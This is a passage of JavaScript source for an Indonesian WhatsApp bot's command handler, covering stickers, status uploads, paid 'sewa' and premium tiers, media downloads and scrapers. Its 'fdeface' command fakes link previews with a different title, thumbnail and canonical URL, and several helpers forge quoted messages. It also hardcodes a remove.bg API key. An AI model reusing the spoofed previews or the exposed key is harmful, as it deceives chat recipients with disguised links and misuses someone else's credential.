		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
		            break
case 'setexif':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                    const namaPack = q.substring(0, q.indexOf('|') - 1)
                    const authorPack = q.substring(q.lastIndexOf('|') + 2)
                    fs.unlinkSync('./sticker/data.exif')
                    sleep(2000)
                    addMetadata(namaPack, authorPack)
                    fakestatus(`Success ubah wm sticker`)
                    break    
		    case 'take':
		    case 'colong':
		    		if (!isQuotedSticker) return reply('```Reply stc nya```')
		            encmedia_ = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    media_ = await alpha.downloadAndSaveMediaMessage(encmedia_)
		            anu = args.join(' ').split('|')
		            satu = anu[0] !== '' ? anu[0] : `SUBSCRIBE`
		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `ZEEONE OFC`
		            require('./lib/fetcher.js').createExif(satu, dua)
					require('./lib/fetcher.js').modStick(media_ , alpha, mek, from)
					break
			case 'stikerwm':
			case 'stickerwm':
		    case 'swm':
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia___ = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia___ = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media___ = await alpha.downloadAndSaveMediaMessage(encmedia___)
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            fakestatus(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
		            }
		            break
		    case 'upswteks':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (!q) return fakestatus('Isi teksnya!')
		            alpha.sendMessage('status@broadcast', `${q}`, extendedText)
		            fakeitem(`Sukses Up story wea teks ${q}`)
		            break
		    case 'upswimage':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedImage) {
		            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
		            bur = `Sukses Upload Story Image dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply gambarnya!```')
		            }
		            break
		    case 'upswvideo':
		            if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		            if (isQuotedVideo) {
		            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
		            bur = `Sukses Upload Story Video dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply videonya!```')
		            }
		            break
		    case 'fdeface':
		            ge = args.join('')           
		            var pe = ge.split("|")[0];
		            var pen = ge.split("|")[1];
		            var pn = ge.split("|")[2];
		            var be = ge.split("|")[3];
		            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
		            if (args.length < 1) return reply (fde)
		            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const tipes = await alpha.downloadAndSaveMediaMessage(dipes)        
		            const bufer = fs.readFileSync(tipes)
		            const desc = `${pn}`
		            const title = `${pen}`
		            const url = `${pe}`
		            const buu = `https://${be}`
		    		var anu = {
		        	detectLinks: false
		    		}
		    		var mat = await alpha.generateLinkPreview(url)
		    		mat.title = title;
		    		mat.description = desc;
		    		mat.jpegThumbnail = bufer;
		   			mat.canonicalUrl = buu; 
		    		alpha.sendMessage(from, mat, MessageType.extendedText, anu)
		            break
		    case 'public':
		              if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === false) return
		          	banChats = false
		          	//fakeitem(`「 *PUBLIC-MODE* 」`)
						sendButMessage(from, `「 *PUBLIC-MODE* 」`, `Click self to return to self mode`, [
            {
              buttonId: 'self',
              buttonText: {
                displayText: `Self Mode`,
              },
              type: 1,
            }]);
        break;
			case 'self':
			          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		          	if (banChats === true) return
		          	banChats = true
		          	//fakeitem(`「 *SELF-MODE* 」`)
		          	sendButMessage(from, `「 *SELF-MODE* 」`, `Click public to return to public mode`, [
            {
              buttonId: 'public',
              buttonText: {
                displayText: `Public Mode`,
              },
              type: 1,
            }]);
        break;
		case 'revoke':
if (!isGroup) return fakegroup(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
await alpha.revokeInvite(from)
reply(lang.success())
break
		 	case 'hidetag':
		     case '_`':
		if (!mek.key.fromMe && !isGroupAdmins && !isOwner && !isCreator) return reply(lang.onlyOwner())
		     if (!isGroup) return fakegroup(lang.onlygc())
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} }  } })
					break
				case 'sewacheck':
				case 'ceksewa':
							if (!isGroup) return fakegroup(lang.onlygc())
							if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
							let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
							let premiumnya = `*「 SEWA EXPIRED 」*\n\n📛 *ID*: ${from}\n⏰ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
							reply(premiumnya)
							break
				case 'sewa':
							if (!isGroup)return fakegroup(lang.onlygc())
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
							if (args[0] === 'add'){
								_sewa.addSewaGroup(from, args[1], sewa)
								reply(lang.success())
								} else if (args[0] === 'del'){
									sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
									fs.writeFileSync('./src/sewa.json', JSON.stringify(sewa))
									reply(lang.success())
									} else {
										reply(`Example : *${prefix}sewa* add/del waktu`)
										}
							break
				case 'sewalist': 
				case 'listsewa':
							let txtnyee = `*「 LIST SEWA」*\nJumlah : ${sewa.length}\n\n`
							for (let i of sewa){
								let cekvipp = ms(i.expired - Date.now())
								txtnyee += `🆔 *ID :* ${i.id} \n⏰ *Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
								}
							reply(txtnyee)
							break
				case 'premium': 
							if (args.length === 0) return reply(`Kirim perintah *${prefix}premium* add/del 62xxx waktu (misal 1 hari -> 1d)\nExample:\n${prefix}premium add 62887435047326 1d`)
							if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
							if (args[0] === 'add') {
								if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									premium.addPremiumUser(mentioned[0], args[2], _premium)
									reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${mentioned[0]}\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
									} else {
										premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
										reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${args[1]}@s.whatsapp.net\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
										}
										} else if (args[0] === 'del') {
											if (mek.message.extendedTextMessage != undefined) {
									mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
									_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
									fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
									reply(lang.success())
									} else {
										_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
										fs.writeFileSync('./src/premiun.json', JSON.stringify(_premium))
										reply(lang.success())
										}
										} else {
											reply('emror')
											}
							break
				case 'premiumcheck': case 'cekpremium': 
							if (!isPremium) return reply(`Akun kamu belum premium silahkan ${prefix}buypremium`)
							const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
							reply(`*「 PREMIUM EXPIRED 」*\n\n🆔 *ID*: ${sender}\n🏦 *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
							break
				case 'listprem': case 'listpremium':
							let txt = `「 *PREMIUM USER LIST* 」\n\n`
							let men = [];
							for (let i of _premium){
								men.push(i.id)
								const checkExp = ms(i.expired - Date.now())
								txt += `🆔 *ID :* @${i.id.split("@")[0]}\n⏰ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
								}
								mentions(txt, men, true)
							break
				case 'payment':
				let paykenekk = await getBuffer('https://telegra.ph/file/3c58eb6b1fda6c22c8668.jpg')
							sendButLocation(from, allpayment() , `Nih payment nya kak 🪀 ${enter}${enter}${botname}™© | By ${ownername}`,paykenekk,  [{"buttonId": `owner`,"buttonText": {"displayText": "OWNER"},"type": "RESPONSE"}], {})
							break
				case 'belipremium': case 'buypremium': case 'sewabot': case 'goprem':
							let sewalak = await getBuffer('https://telegra.ph/file/5e96a14f1ebaee0df2e24.jpg')
							sendButLocation(from, pc_sewa(_minggu, __minggu, ___minggu, _bulan, _permanen, __permanen) , `Jangan klik doang harus sewa beneran 😎 ${enter}${enter}${botname}™© | By ${ownername}`,sewalak,  [{"buttonId": `payment`,"buttonText": {"displayText": "PAYMENT"},"type": "RESPONSE"}], {})
							break
				case 'donasi': case 'donate':
							let donas = await getBuffer('https://telegra.ph/file/2203a91ba6216de345c3d.jpg')
							sendButLocation(from, donasibot() , `Jangan klik doang, donasi ya 🌝 ${enter}${enter}${botname}™© | By ${ownername}`,donas,  [{"buttonId": `qr_gopay1`,"buttonText": {"displayText": "QR GOPAY"},"type": "RESPONSE"},{"buttonId": `qr_dana1`,"buttonText": {"displayText": "QR DANA"},"type": "RESPONSE"},{"buttonId": `qr_ovo1`,"buttonText": {"displayText": "QR OVO"},"type": "RESPONSE"}], {})
							break
				case 'gcbot': case 'grupbot': case 'groupbot':
							let gcbot = await getBuffer('https://telegra.ph/file/09d4f9b77a0745f35bdfa.jpg')
							sendButLocation(from, gcbotwa() , `Jangan klik doang, join napa 〽️ ${enter}${enter}${botname}™© | By ${ownername}`,gcbot,  [{"buttonId": `sewabot`,"buttonText": {"displayText": "SEWABOT"},"type": "RESPONSE"}], {})
							break
				case 'infobot':
				let infobopot = await getBuffer('https://telegra.ph/file/06fad83011a4b1cecd4ba.jpg')
							sendButLocation(from, infobot(latensii, totalchat, giid, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, ownerNumberrr,runtime, kyun) , `${enter}${enter}${botname} 〽️ | By ${ownername}`,infobopot,  [{"buttonId": 'gcbot',"buttonText": {"displayText": "GROUP BOT"},"type": "RESPONSE"}], {})
							break
			case 'play2':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                        const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
		                       await sendMediaURL(from, thumb, captions)
		                        sendMediaURL(from, dl_link).catch(() => reply('error'))
		                        })                
		                        })
		                        } catch (err) {
		                        reply(mess.error.api)
		                        }
		                   break  
		
		               case 'sticker':
					case 'stiker': case 's':
					
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await alpha.downloadAndSaveMediaMessage(encmedia)
							ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .input(media)
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                 })
                            .on('end', async function () {
                                console.log('Finish')
                                await alpha.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: fgclink })
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(ran)
                                })
                            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(ran)
                    } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                        const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                        ran = getRandom('.webp')
                        await ffmpeg(`./${media}`)
                            .inputFormat(media.split('.')[1])
                            .on('start', function (cmd) {
                                console.log(`Started : ${cmd}`)
                            })
                            .on('error', function (err) {
                                console.log(`Error : ${err}`)
                                fs.unlinkSync(media)
                                tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                                reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
                            })
                            .on('end', async function () {
                                console.log('Finish')
                                await alpha.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: fgclink })
                                    fs.unlinkSync(media)
                                    fs.unlinkSync(ran)
                                })
                            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                            .toFormat('webp')
                            .save(ran)
                    } else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        const media = await alpha.downloadAndSaveMediaMessage(encmedia)
                        ranw = getRandom('.webp')
                        ranp = getRandom('.png')
                        reply(mess.wait)
                        keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
                        await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
                            fs.unlinkSync(media)
                            let bufferir9vn5 = Buffer.from(res.base64img, 'base64')
                            fs.writeFileSync(ranp, bufferir9vn5, (err) => {
                                if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba beberapa saat lagi.')
                            })
                            exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
                                fs.unlinkSync(ranp)
                                if (err) return reply('emror bang')
                                alpha.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: mek })
                                    fs.unlinkSync(ranw)
                                })
                            })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim\nDurasi sticker video 1-9 detik...`)
                    }
                    break
		    case 'toimg':
		if (!isQuotedSticker) return reply('Reply stc nya!')
					reply(lang.wait())
					encmediaa = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaa = await alpha.downloadAndSaveMediaMessage(encmediaa)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${mediaa} ${ran}`, (err) => {
					fs.unlinkSync(mediaa)
					if (err) return reply('Yah gagal, coba ulangi ^_^')
					buffer = fs.readFileSync(ran)
					fakethumb(buffer,'```Nih kak```')
					fs.unlinkSync(ran)
					})
					break
			case 'ytsearch': case 'yts':
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join(' ');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await alpha.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '🐣 Title: ' + video.title + '\n'
		            ytresult += '🐤 Link: ' + video.url + '\n'
		            ytresult += '🦊 Durasi: ' + video.timestamp + '\n'
					ytresult += '🐺 Views: ' + video.views + '\n'
		            ytresult += '🦡 Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '*WHATSAPP-BOT*'
		    		await fakethumb(tbuff,ytresult)
					break
			case 'setreply':
			case 'setfake':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!q) return fakegroup(mess.wrongFormat)
					fake = q
					fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
					break
			case 'setprefix':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
reply('Pke yg multi aja')
/*if (args.length < 1) return reply(`*Format Error!*\n\n*Example :*\n •${prefix + command} multi\n •${prefix + command} nopref\n •${prefix + command} #`)
if((args[0]) == 'multi'){
if(multi)return reply('_Sudah diaktifkan sebelumnya!_')
multi = true
nopref = false
single = false
reply(`_Succses mengganti Prefix ke Multiprefix!_`)
}else
if ((args[0]) == 'nopref'){
if(nopref)return reply('_Sudah diaktifkan sebelumnya!_')
multi = false
single = false
nopref = true
reply(`_Succses mengganti Prefix ke noprefix!_`)
}else
if((args[0]) == `${q}`){
multi = false
nopref = false
single = true
prefa = `${q}`
reply(`_Succses mengganti Prefix ke ${q}_`)
}*/
break
			case 'set_stc_menu':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_menu = q
					fakeitem(`Succes Mengganti stc cmd *MENU* : ${q}`)
					break
			case 'set_stc_ping':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_ping = q
					fakeitem(`Succes Mengganti stc cmd *PING* : ${q}`)
					break
			case 'set_stc_music':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_play_music = q
					fakeitem(`Succes Mengganti stc cmd *PlAY MUSIC* : ${q}`)
					break
			case 'set_stc_gclose':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_close = q
					fakeitem(`Succes Mengganti stc cmd *GROUP CLOSE* : ${q}`)
					break
			case 'set_stc_gopen':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_group_open = q
					fakeitem(`Succes Mengganti stc cmd *GROUP OPEN* : ${q}`)
					break
			case 'set_stc_itos':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_image_to_sticker = q
					fakeitem(`Succes Mengganti stc cmd *IMAGE TO. STICKER* : ${q}`)
					break
			case 'set_stc_to_image':
			case 'set_stc_toimg':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_to_image = q
					fakeitem(`Succes Mengganti stc cmd *STICKER TO IMAGE* : ${q}`)
					break
			case 'set_stc_self':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_self = q
					fakeitem(`Succes Mengganti stc cmd *SELF* : ${q}`)
					break
			case 'set_stc_public':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			if (args.length < 1) return reply('Tolong masukan Masukkan FileLenght sticker')
					cmd_stc_public = q
					fakeitem(`Succes Mengganti stc cmd *PUBLIC* : ${q}`)
					break
			case 'setfakeimg':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
		        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		            boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakeitem(`Kirim gambar dengan caption ${prefix}setfakeimg`)
		          	}
					break	
			case 'setthumb':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
		          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					delb = await alpha.downloadMediaMessage(boij)
					fs.readFileSync(`./image/${thumbnail}`, delb)
					fakestatus('Sukses')
		        	} else {
		            fakegroup(`Kirim gambar dengan caption ${prefix}sethumb`)
		          	}
					break	
			case 'image':
		            if (args.length < 1) return fakegroup('Masukan teks!')
		            const gimg = args.join('');
		            res = await gis(gimg, google)
		            function google(error, result){
              if (error){ return reply('Not found')}
              else {
					n = result
		            images = n[Math.floor(Math.random() * n.length)].url
		            alpha.sendMessage(from,images,image,{quoted:mek})
		            }}
		            break
		    
		    case 'brainly':
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					alpha.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            }).catch(e => {
					reply('Terjadi kesalahan, coba beberapa saat lagi')
					})             
					break
		
      
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
		    case 'igstalk':
		       if (!q) return fakegroup('Usernamenya?')
		var halzmal = q
		            const tod = await fetchJson(`https://ferdiz-afk.my.id/api/stalkig?username=${halzmal}`);
var nih_buff = await getBuffer(tod.picurl);
const tt = `*INSTAGRAM STALK*

\nUsername: ${tod.username}\nFullname: ${tod.fullname}\npostingan: ${tod.post}\ncategory_akun: ${tod.category_name}\nverified: ${tod.verified_user}\nprivate: ${tod.private_user}\nFollowing: ${tod.following}\nFollower: ${tod.followers}\nBio:\n${tod.bio}`;
alpha.sendMessage(from, nih_buff, image, { quoted: mek, caption: tt });
break    
		    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(lang.erorLink())
            reply(lang.wait())
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*LINK VIDEO* : ${G.Normal_video}`)
            })
            break    
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            alpha.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
			case 'term':
			
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
